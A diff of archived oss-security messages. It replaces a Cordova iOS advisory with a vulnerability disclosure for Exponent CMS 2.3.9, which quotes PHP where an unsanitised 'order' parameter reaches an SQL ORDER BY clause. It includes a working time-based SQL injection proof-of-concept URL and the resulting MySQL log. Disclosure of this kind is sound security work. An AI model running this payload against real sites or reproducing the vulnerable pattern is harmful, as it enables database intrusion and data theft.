@@ -1,22 +1,107 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/04/27/8
-Message-ID: <CAKkdKCC_PKa-s=jk9+Bq+bXcJ3_RmOH-Gs3BjDGMOje9WwMNUw@mail.gmail.com>
-Date: Wed, 27 Apr 2016 15:19:16 -0400
-From: Tony Homer <ajh158@...il.com>
-To: dev@...dova.apache.org, private@...dova.apache.org,  "JPCERT/CC" <vuls@...ert.or.jp>, security@...che.org, oss-security@...ts.openwall.com,  bugtraq@...urityfocus.com
-Subject: CVE-2015-5207 - Bypass of Access Restrictions in Apache Cordova iOS
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/19/4
+Message-ID: <CAJ8RaNbqj2sOAtx51OZ7_7O2TbP2q8+O=7G14xjXz5bcAM1NcQ@mail.gmail.com>
+Date: Mon, 19 Sep 2016 08:08:32 -0400
+From: 王禹哲 <0xtom4to@...il.com>
+To: oss-security@...ts.openwall.com
+Cc: cve-assign@...re.org
+Subject: Exponent CMS 2.3.9 SQL injection vulnerabilities
 Content-Type: text/plain; charset=utf-8
 
-CVE-2015-5207 - Bypass of Access Restrictions in Apache Cordova iOS
-Severity: High
-Vendor: The Apache Software Foundation
-Versions Affected:cordova-ios 3.9.1 and below
-Description:Apache Cordova iOS contains 2 methods to bypass the URL access
-restrictions provided by the whitelist. An attacker can use any of the 2
-methods to load malicious resources in an app that uses a whitelist to only
-load trusted resources.
-Upgrade path:Developers who are concerned about this issue should install
-version 4.0.0 or higher of the cordova-ios platform.
-Credit:This issue was discovered by Muneaki Nishimura (nishimunea) of
-Recruit Technologies Co.,Ltd.
+Author: Tomato, jianing.wang@...itin.com
+
+Date:2016–09–19
+
+Version: 2.3.9 and earlier
+
+/exponent–2.3.9/framework/core/subsystems/expPaginator.php
+
+
+if (strstr($this->order," ")) {
+            $orderby = explode(" ",$this->order);
+            $this->order = $orderby[0];
+            $this->order_direction = $orderby[1];
+        }
+        if ($this->dontsort)
+            $sort = null;
+        else
+            $sort = $this->order.' '.$this->order_direction;
+
+        // figure out how many records we're dealing with & grab the records
+        //if (!empty($this->records)) { //from Merge <~~ this doesn't
+work. Could be empty, but still need to hit.
+        if (!empty($this->categorize))
+            $limit = null;
+        else
+            $limit = $this->limit;
+
+        if (isset($params['records'])) { // if we pass
+$params['records'], we WANT to hit this
+            // sort the records that were passed in to us
+            if (!empty($sort))
+                usort($this->records,array('expPaginator',
+strtolower($this->order_direction)));
+//          $this->total_records = count($this->records);
+        } elseif (!empty($class)) { //where clause     //FJD: was
+$this->class, but wasn't working...
+            $this->total_records = $class->find('count', $this->where);
+            $this->records = $class->find('all', $this->where, $sort,
+$limit, $this->start);
+        } elseif (!empty($this->where)) { //from Merge....where clause
+            $this->total_records = $class->find('count', $this->where);
+            $this->records = $class->find('all', $this->where, $sort,
+$limit, $this->start);
+        } else { //sql clause  //FIXME we don't get attachments in this approach
+            //$records = $db->selectObjectsBySql($this->sql);
+            //$this->total_records = count($records);
+            //this is MUCH faster if you supply a proper count_sql
+param using a COUNT() function; if not,
+            //we'll run the standard sql and do a queryRows with it
+            //$this->total_records = $this->count_sql == '' ?
+$db->queryRows($this->sql) : $db->selectValueBySql($this->count_sql);
+//From Merge
+
+//          $this->total_records =
+$db->countObjectsBySql($this->count_sql);
+//$db->queryRows($this->sql); //From most current Trunk
+
+            if (!empty($sort)) $this->sql .= ' ORDER BY '.$sort;
+
+
+i can controller $order ,i can use this parameter to sql injection
+
+such as
+
+exponent–2.3.9/framework/modules/company/controllers/companyController.php
+
+```php function showall() { expHistory::set(‘viewable’, $this->params);
+$page = new expPaginator(array( ‘model’=>$this->basemodel_name, ‘where’=>1,
+‘limit’=>(isset($this->params[‘limit’]) && $this->config[‘limit’] != ’‘) ?
+$this->params[‘limit’] : 10, ‘order’=>isset($this->params[‘order’]) ?
+$this->params[‘order’] : ‘rank’, ‘page’=>(isset($this->params[‘page’]) ?
+$this->params[‘page’] : 1), ‘controller’=>$this->baseclassname,
+‘action’=>$this->params[‘action’], ‘columns’=>array(
+gt(‘Manufacturer’)=>’title’, gt(‘Website’)=>’website’ ), ));
+
+    assign_to_template(array(
+        'page'=>$page,
+        'items'=>$page->records
+    ));
+}
+```
+
+the poc is
+
+http://127.0.0.1/exponent–2.3.9/index.php?controller=company&action=showall&limit=1&order=(select/*
+*/*/*/from/*/(select/**/sleep(5))x)%23
+
+in the mysql log we can see this
+
+SELECT * FROM exponent_companies WHERE 1 ORDER BY
+(select/**/*/*/from/*/(select/**/sleep(5))x)#
+ASC LIMIT 0,10
+
+Could you assign CVE id for this?
+
+Regards, Tomato
 
